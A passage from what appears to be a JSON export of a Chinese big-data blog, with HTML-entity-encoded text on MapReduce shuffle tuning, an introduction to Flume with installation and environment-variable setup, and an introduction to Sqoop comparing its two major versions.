&#x6BD4;&#x5982;&#x4E3A;&#x4E86;&#x51CF;&#x5C11;&#x78C1;&#x76D8;IO&#x7684;&#x6D88;&#x8017;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8C03;&#x8282;io.sort.mb&#x7684;&#x5C5E;&#x6027;&#x3002;&#x6BCF;&#x4E2A;Map&#x4EFB;&#x52A1;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x5199;&#x5165;&#x8F93;&#x51FA;&#x6570;&#x636E;&#x7684;&#x5FAA;&#x73AF;&#x5185;&#x5B58;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x8FD9;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x9ED8;&#x8BA4;&#x5927;&#x5C0F;&#x662F;100M&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;io.sort.mb&#x8BBE;&#x7F6E;&#xFF0C;&#x5F53;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x91CF;&#x8FBE;&#x5230;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x9600;&#x503C;(io.sort.mb * io.sort.spill.percent&#xFF0C;&#x5176;&#x4E2D;io.sort.spill.percent &#x9ED8;&#x8BA4;&#x662F;0.80)&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x5C06;&#x4F1A;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x540E;&#x53F0;&#x7EBF;&#x7A0B;&#x628A;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x7684;&#x5185;&#x5BB9;spill &#x5230;&#x78C1;&#x76D8;&#x3002;&#x5728;spill&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;Map&#x7684;&#x8F93;&#x51FA;&#x5C06;&#x4F1A;&#x7EE7;&#x7EED;&#x5199;&#x5165;&#x5230;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x7F13;&#x51B2;&#x533A;&#x5DF2;&#x7ECF;&#x6EE1;&#x4E86;&#xFF0C;Map&#x5C31;&#x4F1A;&#x88AB;&#x963B;&#x585E;&#x76F4;&#x9053;spill&#x5B8C;&#x6210;&#x3002; spill&#x7EBF;&#x7A0B;&#x5728;&#x628A;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x6570;&#x636E;&#x5199;&#x5230;&#x78C1;&#x76D8;&#x524D;&#xFF0C;&#x4F1A;&#x5BF9;&#x4ED6;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x4E8C;&#x6B21;&#x6392;&#x5E8F;&#xFF0C;&#x9996;&#x5148;&#x6839;&#x636E;&#x6570;&#x636E;&#x6240;&#x5C5E;&#x7684;partition&#x6392;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x4E2A;partition&#x4E2D;&#x518D;&#x6309;Key&#x6392;&#x5E8F;&#x3002;&#x8F93;&#x51FA;&#x5305;&#x62EC;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;&#x6587;&#x4EF6;&#x548C;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x8BBE;&#x5B9A;&#x4E86;Combiner&#xFF0C;&#x5C06;&#x5728;&#x6392;&#x5E8F;&#x8F93;&#x51FA;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x8FDB;&#x884C;&#x3002;Combiner&#x5C31;&#x662F;&#x4E00;&#x4E2A;Mini Reducer&#xFF0C;&#x5B83;&#x5728;&#x6267;&#x884C;Map&#x4EFB;&#x52A1;&#x7684;&#x8282;&#x70B9;&#x672C;&#x8EAB;&#x8FD0;&#x884C;&#xFF0C;&#x5148;&#x5BF9;Map&#x7684;&#x8F93;&#x51FA;&#x4F5C;&#x4E00;&#x6B21;&#x7B80;&#x5355;&#x7684;Reduce&#xFF0C;&#x4F7F;&#x5F97;Map&#x7684;&#x8F93;&#x51FA;&#x66F4;&#x7D27;&#x51D1;&#xFF0C;&#x66F4;&#x5C11;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x5199;&#x5165;&#x78C1;&#x76D8;&#x548C;&#x4F20;&#x9001;&#x5230;Reducer&#x3002;Spill&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x5728;&#x7531;mapred.local.dir&#x6307;&#x5B9A;&#x7684;&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;Map&#x4EFB;&#x52A1;&#x7ED3;&#x675F;&#x540E;&#x5220;&#x9664;&#x3002; Shuffle&#x5176;&#x4ED6;&#x7EC6;&#x8282;&#x8FD9;&#x91CC;&#x4E0D;&#x518D;&#x8BE6;&#x8FF0;&#xFF0C;&#x4E0B;&#x9762;&#x8FD9;&#x4E9B;&#x6587;&#x7AE0;&#x53EF;&#x80FD;&#x5BF9;&#x5927;&#x5BB6;&#x6709;&#x6240;&#x5E2E;&#x52A9;&#xFF1A;http://my.oschina.net/u/2003855/blog/310301http://blog.csdn.net/thomas0yang/article/details/8562910","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://www.wangxin123.com/categories/大数据/"}],"tags":[{"name":"MapReduce","slug":"MapReduce","permalink":"http://www.wangxin123.com/tags/MapReduce/"}]},{"title":"Flume简介及安装","slug":"Flume简介及安装","date":"2017-02-27T13:18:00.000Z","updated":"2017-02-27T08:55:11.034Z","comments":true,"path":"2017/02/27/Flume简介及安装/","link":"","permalink":"http://www.wangxin123.com/2017/02/27/Flume简介及安装/","excerpt":"Hadoop&#x4E1A;&#x52A1;&#x7684;&#x5927;&#x81F4;&#x5F00;&#x53D1;&#x6D41;&#x7A0B;&#x4EE5;&#x53CA;Flume&#x5728;&#x4E1A;&#x52A1;&#x4E2D;&#x7684;&#x5730;&#x4F4D;&#xFF1A; &#x4ECE;Hadoop&#x7684;&#x4E1A;&#x52A1;&#x5F00;&#x53D1;&#x6D41;&#x7A0B;&#x56FE;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5728;&#x5927;&#x6570;&#x636E;&#x7684;&#x4E1A;&#x52A1;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5BF9;&#x4E8E;&#x6570;&#x636E;&#x7684;&#x91C7;&#x96C6;&#x662F;&#x5341;&#x5206;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x6B65;&#xFF0C;&#x4E5F;&#x662F;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x4E00;&#x6B65;&#xFF0C;&#x4ECE;&#x800C;&#x5F15;&#x51FA;&#x6211;&#x4EEC;&#x672C;&#x6587;&#x7684;&#x4E3B;&#x89D2;&#x2014;Flume&#x3002; Flume&#x6982;&#x5FF5;flume&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x65E5;&#x5FD7;&#x6536;&#x96C6;&#x7CFB;&#x7EDF;&#xFF0C;&#x5B83;&#x5C06;&#x5404;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6536;&#x96C6;&#x8D77;&#x6765;&#x5E76;&#x9001;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x5730;&#x65B9;&#x53BB;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#x9001;&#x5230;&#x56FE;&#x4E2D;&#x7684;HDFS&#xFF0C;&#x7B80;&#x5355;&#x6765;&#x8BF4;flume&#x5C31;&#x662F;&#x6536;&#x96C6;&#x65E5;&#x5FD7;&#x7684;&#x3002;","keywords":null,"text":"Hadoop&#x4E1A;&#x52A1;&#x7684;&#x5927;&#x81F4;&#x5F00;&#x53D1;&#x6D41;&#x7A0B;&#x4EE5;&#x53CA;Flume&#x5728;&#x4E1A;&#x52A1;&#x4E2D;&#x7684;&#x5730;&#x4F4D;&#xFF1A; &#x4ECE;Hadoop&#x7684;&#x4E1A;&#x52A1;&#x5F00;&#x53D1;&#x6D41;&#x7A0B;&#x56FE;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5728;&#x5927;&#x6570;&#x636E;&#x7684;&#x4E1A;&#x52A1;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5BF9;&#x4E8E;&#x6570;&#x636E;&#x7684;&#x91C7;&#x96C6;&#x662F;&#x5341;&#x5206;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x6B65;&#xFF0C;&#x4E5F;&#x662F;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x4E00;&#x6B65;&#xFF0C;&#x4ECE;&#x800C;&#x5F15;&#x51FA;&#x6211;&#x4EEC;&#x672C;&#x6587;&#x7684;&#x4E3B;&#x89D2;&#x2014;Flume&#x3002; Flume&#x6982;&#x5FF5;flume&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x65E5;&#x5FD7;&#x6536;&#x96C6;&#x7CFB;&#x7EDF;&#xFF0C;&#x5B83;&#x5C06;&#x5404;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6536;&#x96C6;&#x8D77;&#x6765;&#x5E76;&#x9001;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x5730;&#x65B9;&#x53BB;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#x9001;&#x5230;&#x56FE;&#x4E2D;&#x7684;HDFS&#xFF0C;&#x7B80;&#x5355;&#x6765;&#x8BF4;flume&#x5C31;&#x662F;&#x6536;&#x96C6;&#x65E5;&#x5FD7;&#x7684;&#x3002; Event&#x6982;&#x5FF5;&#x5728;&#x8FD9;&#x91CC;&#x6709;&#x5FC5;&#x8981;&#x5148;&#x4ECB;&#x7ECD;&#x4E00;&#x4E0B;flume&#x4E2D;event&#x7684;&#x76F8;&#x5173;&#x6982;&#x5FF5;&#xFF1A;flume&#x7684;&#x6838;&#x5FC3;&#x662F;&#x628A;&#x6570;&#x636E;&#x4ECE;&#x6570;&#x636E;&#x6E90;(source)&#x6536;&#x96C6;&#x8FC7;&#x6765;&#xFF0C;&#x5728;&#x5C06;&#x6536;&#x96C6;&#x5230;&#x7684;&#x6570;&#x636E;&#x9001;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x76EE;&#x7684;&#x5730;(sink)&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x8F93;&#x9001;&#x7684;&#x8FC7;&#x7A0B;&#x4E00;&#x5B9A;&#x6210;&#x529F;&#xFF0C;&#x5728;&#x9001;&#x5230;&#x76EE;&#x7684;&#x5730;(sink)&#x4E4B;&#x524D;&#xFF0C;&#x4F1A;&#x5148;&#x7F13;&#x5B58;&#x6570;&#x636E;(channel),&#x5F85;&#x6570;&#x636E;&#x771F;&#x6B63;&#x5230;&#x8FBE;&#x76EE;&#x7684;&#x5730;(sink)&#x540E;&#xFF0C;flume&#x5728;&#x5220;&#x9664;&#x81EA;&#x5DF1;&#x7F13;&#x5B58;&#x7684;&#x6570;&#x636E;&#x3002; &#x5728;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x7684;&#x4F20;&#x8F93;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6D41;&#x52A8;&#x7684;&#x662F;event&#xFF0C;&#x5373;&#x4E8B;&#x52A1;&#x4FDD;&#x8BC1;&#x662F;&#x5728;event&#x7EA7;&#x522B;&#x8FDB;&#x884C;&#x7684;&#x3002;&#x90A3;&#x4E48;&#x4EC0;&#x4E48;&#x662F;event&#x5462;&#xFF1F;&#x2014;&#x2013;event&#x5C06;&#x4F20;&#x8F93;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5C01;&#x88C5;&#xFF0C;&#x662F;flume&#x4F20;&#x8F93;&#x6570;&#x636E;&#x7684;&#x57FA;&#x672C;&#x5355;&#x4F4D;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x6587;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x901A;&#x5E38;&#x662F;&#x4E00;&#x884C;&#x8BB0;&#x5F55;&#xFF0C;event&#x4E5F;&#x662F;&#x4E8B;&#x52A1;&#x7684;&#x57FA;&#x672C;&#x5355;&#x4F4D;&#x3002;event&#x4ECE;source&#xFF0C;&#x6D41;&#x5411;channel&#xFF0C;&#x518D;&#x5230;sink&#xFF0C;&#x672C;&#x8EAB;&#x4E3A;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#xFF0C;&#x5E76;&#x53EF;&#x643A;&#x5E26;headers(&#x5934;&#x4FE1;&#x606F;)&#x4FE1;&#x606F;&#x3002;event&#x4EE3;&#x8868;&#x7740;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x7684;&#x6700;&#x5C0F;&#x5B8C;&#x6574;&#x5355;&#x5143;&#xFF0C;&#x4ECE;&#x5916;&#x90E8;&#x6570;&#x636E;&#x6E90;&#x6765;&#xFF0C;&#x5411;&#x5916;&#x90E8;&#x7684;&#x76EE;&#x7684;&#x5730;&#x53BB;&#x3002; &#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x5927;&#x5BB6;&#x7406;&#x89E3;&#xFF0C;&#x7ED9;&#x51FA;&#x4E00;&#x5F20;event&#x7684;&#x6570;&#x636E;&#x6D41;&#x5411;&#x56FE;&#xFF1A; &#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;event&#x5305;&#x62EC;&#xFF1A;event headers&#x3001;event body&#x3001;event&#x4FE1;&#x606F;(&#x5373;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5355;&#x884C;&#x8BB0;&#x5F55;)&#xFF0C;&#x5176;&#x4E2D;event&#x4FE1;&#x606F;&#x5C31;&#x662F;flume&#x6536;&#x96C6;&#x5230;&#x7684;&#x65E5;&#x8BB0;&#x8BB0;&#x5F55;&#x3002; Flume&#x67B6;&#x6784;flume&#x4E4B;&#x6240;&#x4EE5;&#x8FD9;&#x4E48;&#x795E;&#x5947;&#xFF0C;&#x662F;&#x6E90;&#x4E8E;&#x5B83;&#x81EA;&#x8EAB;&#x7684;&#x4E00;&#x4E2A;&#x8BBE;&#x8BA1;&#xFF0C;&#x8FD9;&#x4E2A;&#x8BBE;&#x8BA1;&#x5C31;&#x662F;agent&#xFF0C;agent&#x672C;&#x8EAB;&#x662F;&#x4E00;&#x4E2A;Java&#x8FDB;&#x7A0B;&#xFF0C;&#x8FD0;&#x884C;&#x5728;&#x65E5;&#x5FD7;&#x6536;&#x96C6;&#x8282;&#x70B9;&#x2014;&#x6240;&#x8C13;&#x65E5;&#x5FD7;&#x6536;&#x96C6;&#x8282;&#x70B9;&#x5C31;&#x662F;&#x670D;&#x52A1;&#x5668;&#x8282;&#x70B9;&#x3002; agent&#x91CC;&#x9762;&#x5305;&#x542B;3&#x4E2A;&#x6838;&#x5FC3;&#x7684;&#x7EC4;&#x4EF6;&#xFF1A;source&#x2014;-&gt;channel&#x2014;&#x2013;&gt;sink,&#x7C7B;&#x4F3C;&#x751F;&#x4EA7;&#x8005;&#x3001;&#x4ED3;&#x5E93;&#x3001;&#x6D88;&#x8D39;&#x8005;&#x7684;&#x67B6;&#x6784;&#x3002; source&#xFF1A;source&#x7EC4;&#x4EF6;&#x662F;&#x4E13;&#x95E8;&#x7528;&#x6765;&#x6536;&#x96C6;&#x6570;&#x636E;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x5904;&#x7406;&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x3001;&#x5404;&#x79CD;&#x683C;&#x5F0F;&#x7684;&#x65E5;&#x5FD7;&#x6570;&#x636E;,&#x5305;&#x62EC;avro&#x3001;thrift&#x3001;exec&#x3001;jms&#x3001;spooling directory&#x3001;netcat&#x3001;sequence generator&#x3001;syslog&#x3001;http&#x3001;legacy&#x3001;&#x81EA;&#x5B9A;&#x4E49;&#x3002; channel&#xFF1A;source&#x7EC4;&#x4EF6;&#x628A;&#x6570;&#x636E;&#x6536;&#x96C6;&#x6765;&#x4EE5;&#x540E;&#xFF0C;&#x4E34;&#x65F6;&#x5B58;&#x653E;&#x5728;channel&#x4E2D;&#xFF0C;&#x5373;channel&#x7EC4;&#x4EF6;&#x5728;agent&#x4E2D;&#x662F;&#x4E13;&#x95E8;&#x7528;&#x6765;&#x5B58;&#x653E;&#x4E34;&#x65F6;&#x6570;&#x636E;&#x7684;&#x2014;&#x2014;&#x5BF9;&#x91C7;&#x96C6;&#x5230;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x7B80;&#x5355;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x53EF;&#x4EE5;&#x5B58;&#x653E;&#x5728;memory&#x3001;jdbc&#x3001;file&#x7B49;&#x7B49;&#x3002; sink&#xFF1A;sink&#x7EC4;&#x4EF6;&#x662F;&#x7528;&#x4E8E;&#x628A;&#x6570;&#x636E;&#x53D1;&#x9001;&#x5230;&#x76EE;&#x7684;&#x5730;&#x7684;&#x7EC4;&#x4EF6;&#xFF0C;&#x76EE;&#x7684;&#x5730;&#x5305;&#x62EC;hdfs&#x3001;logger&#x3001;avro&#x3001;thrift&#x3001;ipc&#x3001;file&#x3001;null&#x3001;Hbase&#x3001;solr&#x3001;&#x81EA;&#x5B9A;&#x4E49;&#x3002; Flume&#x8FD0;&#x884C;&#x673A;&#x5236;flume&#x7684;&#x6838;&#x5FC3;&#x5C31;&#x662F;&#x4E00;&#x4E2A;agent&#xFF0C;&#x8FD9;&#x4E2A;agent&#x5BF9;&#x5916;&#x6709;&#x4E24;&#x4E2A;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x63A5;&#x53D7;&#x6570;&#x636E;&#x7684;&#x8F93;&#x5165;&#x2014;&#x2014;source&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x6570;&#x636E;&#x7684;&#x8F93;&#x51FA;sink&#xFF0C;sink&#x8D1F;&#x8D23;&#x5C06;&#x6570;&#x636E;&#x53D1;&#x9001;&#x5230;&#x5916;&#x90E8;&#x6307;&#x5B9A;&#x7684;&#x76EE;&#x7684;&#x5730;&#x3002;source&#x63A5;&#x6536;&#x5230;&#x6570;&#x636E;&#x4E4B;&#x540E;&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x53D1;&#x9001;&#x7ED9;channel&#xFF0C;chanel&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x533A;&#x4F1A;&#x4E34;&#x65F6;&#x5B58;&#x653E;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF0C;&#x968F;&#x540E;sink&#x4F1A;&#x5C06;channel&#x4E2D;&#x7684;&#x6570;&#x636E;&#x53D1;&#x9001;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x5730;&#x65B9;&#x2014;-&#x4F8B;&#x5982;HDFS&#x7B49;&#xFF0C;&#x6CE8;&#x610F;&#xFF1A;&#x53EA;&#x6709;&#x5728;sink&#x5C06;channel&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6210;&#x529F;&#x53D1;&#x9001;&#x51FA;&#x53BB;&#x4E4B;&#x540E;&#xFF0C;channel&#x624D;&#x4F1A;&#x5C06;&#x4E34;&#x65F6;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5220;&#x9664;&#xFF0C;&#x8FD9;&#x79CD;&#x673A;&#x5236;&#x4FDD;&#x8BC1;&#x4E86;&#x6570;&#x636E;&#x4F20;&#x8F93;&#x7684;&#x53EF;&#x9760;&#x6027;&#x4E0E;&#x5B89;&#x5168;&#x6027;&#x3002; Flume&#x5E7F;&#x4E49;&#x7528;&#x6CD5;flume&#x4E4B;&#x6240;&#x4EE5;&#x8FD9;&#x4E48;&#x795E;&#x5947;&#x2014;-&#x5176;&#x539F;&#x56E0;&#x4E5F;&#x5728;&#x4E8E;flume&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x591A;&#x7EA7;flume&#x7684;agent&#xFF0C;&#x5373;flume&#x53EF;&#x4EE5;&#x524D;&#x540E;&#x76F8;&#x7EE7;&#xFF0C;&#x4F8B;&#x5982;sink&#x53EF;&#x4EE5;&#x5C06;&#x6570;&#x636E;&#x5199;&#x5230;&#x4E0B;&#x4E00;&#x4E2A;agent&#x7684;source&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#x5C31;&#x53EF;&#x4EE5;&#x8FDE;&#x6210;&#x4E32;&#x4E86;&#xFF0C;&#x53EF;&#x4EE5;&#x6574;&#x4F53;&#x5904;&#x7406;&#x4E86;&#x3002;flume&#x8FD8;&#x652F;&#x6301;&#x6247;&#x5165;(fan-in)&#x3001;&#x6247;&#x51FA;(fan-out)&#x3002;&#x6240;&#x8C13;&#x6247;&#x5165;&#x5C31;&#x662F;source&#x53EF;&#x4EE5;&#x63A5;&#x53D7;&#x591A;&#x4E2A;&#x8F93;&#x5165;&#xFF0C;&#x6240;&#x8C13;&#x6247;&#x51FA;&#x5C31;&#x662F;sink&#x53EF;&#x4EE5;&#x5C06;&#x6570;&#x636E;&#x8F93;&#x51FA;&#x591A;&#x4E2A;&#x76EE;&#x7684;&#x5730;destination&#x4E2D;&#x3002; &#x5B89;&#x88C5;&#x914D;&#x7F6E;1&#x3001;&#x5B89;&#x88C5;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;http://mirrors.hust.edu.cn/apache/flume/1.7.0/ 2&#x3001;&#x89E3;&#x538B;&#x7F29;12tar -zxvf apache-flume-1.7.0-bin.tar.gz -C /datamv apache-flume-1.7.0-bin flume 3&#x3001;&#x914D;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;123456vim /etc/profileexport FLUME_HOME=/data/flumeexport PATH=$PATH:$FLUME_HOME/binsource /etc/profile 4&#x3001;&#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x6210;&#x529F;123456[root@iZwz9b62gfdv0s2e67yo8kZ /]# flume-ng versionFlume 1.7.0Source code repository: https://git-wip-us.apache.org/repos/asf/flume.gitRevision: 511d868555dd4d16e6ce4fedc72c2d1454546707Compiled by bessbd on Wed Oct 12 20:51:10 CEST 2016From source with checksum 0d21b3ffdc55a07e1d08875872c00523 &#x94FE;&#x63A5;&#x76F8;&#x5173;&#x5927;&#x6570;&#x636E;&#x8FDB;&#x9636;&#x8BA1;&#x5212;http://wangxin123.com/2017/02/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%BF%9B%E9%98%B6%E8%AE%A1%E5%88%92/ Flume&#x4E0B;&#x8F7D;&#x5730;&#x5740;http://mirrors.hust.edu.cn/apache/flume/1.7.0/","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://www.wangxin123.com/categories/大数据/"}],"tags":[{"name":"Flume","slug":"Flume","permalink":"http://www.wangxin123.com/tags/Flume/"}]},{"title":"Sqoop简介及安装","slug":"Sqoop简介及安装","date":"2017-02-27T13:18:00.000Z","updated":"2017-02-27T08:54:24.546Z","comments":true,"path":"2017/02/27/Sqoop简介及安装/","link":"","permalink":"http://www.wangxin123.com/2017/02/27/Sqoop简介及安装/","excerpt":"Hadoop&#x4E1A;&#x52A1;&#x7684;&#x5927;&#x81F4;&#x5F00;&#x53D1;&#x6D41;&#x7A0B;&#x4EE5;&#x53CA;Sqoop&#x5728;&#x4E1A;&#x52A1;&#x4E2D;&#x7684;&#x5730;&#x4F4D;&#xFF1A; Sqoop&#x6982;&#x5FF5;Sqoop&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x3010;SQL&#x2013;to&#x2013;Hadoop&#x3011;&#xFF0C;&#x6B63;&#x5982;&#x540D;&#x5B57;&#x6240;&#x793A;&#xFF0C;Sqoop&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x5C06;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x548C;Hadoop&#x4E2D;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x76F8;&#x4E92;&#x8F6C;&#x79FB;&#x7684;&#x5DE5;&#x5177;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x5C06;&#x4E00;&#x4E2A;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;(&#x4F8B;&#x5982;Mysql&#x3001;Oracle)&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5BFC;&#x5165;&#x5230;Hadoop(&#x4F8B;&#x5982;HDFS&#x3001;Hive&#x3001;Hbase)&#x4E2D;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;Hadoop(&#x4F8B;&#x5982;HDFS&#x3001;Hive&#x3001;Hbase)&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5BFC;&#x5165;&#x5230;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;(&#x4F8B;&#x5982;Mysql&#x3001;Oracle)&#x4E2D;&#x3002;","keywords":null,"text":"Hadoop&#x4E1A;&#x52A1;&#x7684;&#x5927;&#x81F4;&#x5F00;&#x53D1;&#x6D41;&#x7A0B;&#x4EE5;&#x53CA;Sqoop&#x5728;&#x4E1A;&#x52A1;&#x4E2D;&#x7684;&#x5730;&#x4F4D;&#xFF1A; Sqoop&#x6982;&#x5FF5;Sqoop&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x3010;SQL&#x2013;to&#x2013;Hadoop&#x3011;&#xFF0C;&#x6B63;&#x5982;&#x540D;&#x5B57;&#x6240;&#x793A;&#xFF0C;Sqoop&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x5C06;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x548C;Hadoop&#x4E2D;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x76F8;&#x4E92;&#x8F6C;&#x79FB;&#x7684;&#x5DE5;&#x5177;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x5C06;&#x4E00;&#x4E2A;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;(&#x4F8B;&#x5982;Mysql&#x3001;Oracle)&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5BFC;&#x5165;&#x5230;Hadoop(&#x4F8B;&#x5982;HDFS&#x3001;Hive&#x3001;Hbase)&#x4E2D;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;Hadoop(&#x4F8B;&#x5982;HDFS&#x3001;Hive&#x3001;Hbase)&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5BFC;&#x5165;&#x5230;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;(&#x4F8B;&#x5982;Mysql&#x3001;Oracle)&#x4E2D;&#x3002; Sqoop&#x7248;&#x672C;&#x5BF9;&#x6BD4;Sqoop1&#x548C;Sqoop2&#x5BF9;&#x6BD4;&#xFF1A; &#x4E24;&#x4E2A;&#x7248;&#x672C;&#xFF0C;&#x5B8C;&#x5168;&#x4E0D;&#x517C;&#x5BB9;&#xFF0C;Sqoop1&#x51E0;&#x4E4E;&#x65E0;&#x6CD5;&#x5E73;&#x6ED1;&#x5347;&#x7EA7;&#x5230;Sqoop2 &#x7248;&#x672C;&#x53F7;&#x5212;&#x5206;&#x533A;&#x522B; Apache&#x7248;&#x672C;&#xFF1A;1.4.x(Sqoop1); 1.99.x(Sqoop2) CDH&#x7248;&#x672C; : Sqoop-1.4.3-cdh4(Sqoop1) ; Sqoop2-1.99.2-cdh4.5.0 (Sqoop2) Sqoop2 &#x76F8;&#x5BF9; Sqoop1&#x7684;&#x6539;&#x8FDB; &#x5F15;&#x5165;Sqoop server&#xFF0C;&#x96C6;&#x4E2D;&#x5316;&#x7BA1;&#x7406;connector&#x7B49; &#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#x591A;&#x6837;&#x5316;&#xFF1A;CLI(command-line interface&#xFF0C;&#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;)&#xFF0C;Web UI&#xFF0C;REST API &#x5F15;&#x5165;&#x57FA;&#x4E8E;&#x89D2;&#x8272;&#x7684;&#x5B89;&#x5168;&#x673A;&#x5236; &#x5728;&#x67B6;&#x6784;&#x4E0A;&#xFF0C;sqoop2&#x5F15;&#x5165;&#x4E86;sqoop server&#xFF08;&#x5177;&#x4F53;&#x670D;&#x52A1;&#x5668;&#x4E3A;tomcat&#xFF09;&#xFF0C;&#x5BF9;connector&#x5B9E;&#x73B0;&#x4E86;&#x96C6;&#x4E2D;&#x7684;&#x7BA1;&#x7406;&#x3002;&#x5176;&#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#x4E5F;&#x53D8;&#x5F97;&#x591A;&#x6837;&#x5316;&#x4E86;&#xFF0C;&#x5176;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;REST API&#x3001;JAVA API&#x3001;WEB UI&#x4EE5;&#x53CA;CLI&#x63A7;&#x5236;&#x53F0;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#x3002; 